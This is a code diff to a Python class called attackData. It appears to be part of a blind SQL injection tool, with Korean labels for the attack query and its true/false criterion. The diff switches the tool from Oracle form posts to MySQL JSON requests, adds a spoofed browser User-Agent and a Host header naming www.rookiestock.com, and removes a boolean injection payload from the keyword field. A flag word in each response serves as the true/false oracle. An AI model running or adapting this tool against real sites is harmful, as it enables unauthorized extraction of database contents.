@@ -6,28 +6,29 @@ class attackData:
     def __init__(self):
         self.base_url = ""
         self.cookies = { "JSESSIONID": "" }
-        self.headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-        self.DB_type = "oracle"
+        self.headers = {'Content-Type': 'application/json',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
+                        'Host': 'www.rookiestock.com'}
+        self.DB_type = "mysql"
 
         self.data = {
-            'searchType':'all',
-            'keyword': "test%' and (1=1) and '1%'='1"}
+            'keywords': ""}
         self.query = ""
-        self.flag_word = "nywtest"
+        self.flag_word = "true"
 
         
 
     def show(self):
         print(f"\nbase URL = {self.base_url}")
         print(f"SessionID = {self.cookies['JSESSIONID']}")
-        print(f"설정된 공격 쿼리 : {self.data['keyword']}")
+        print(f"설정된 공격 쿼리 : {self.data['keywords']}")
         print(f"true 판별 기준(flag_word) = {self.flag_word}")
 
     def set_url(self,new_url):
         self.base_url = new_url
 
     def set_query(self,attack_query):
-        self.data['keyword'] = attack_query
+        self.data['keywords'] = attack_query
 
     def set_cookies(self,cookie):
         self.cookies = cookie
@@ -58,13 +59,10 @@ class attackData:
         if(request_string != ""):
             self.set_query(request_string)
 
-        res = requests.post(self.base_url, cookies=self.cookies, data=self.data, headers=self.headers)
+        res = requests.post(self.base_url, cookies=self.cookies, json=self.data, headers=self.headers)
         
         #print(res.text)
-        if '권한' in res.text:
-            print("\n세션 ID 교체") 
-            return False
-        elif self.flag_word in res.text:
+        if self.flag_word in res.text:
             return True
         else:
             return False
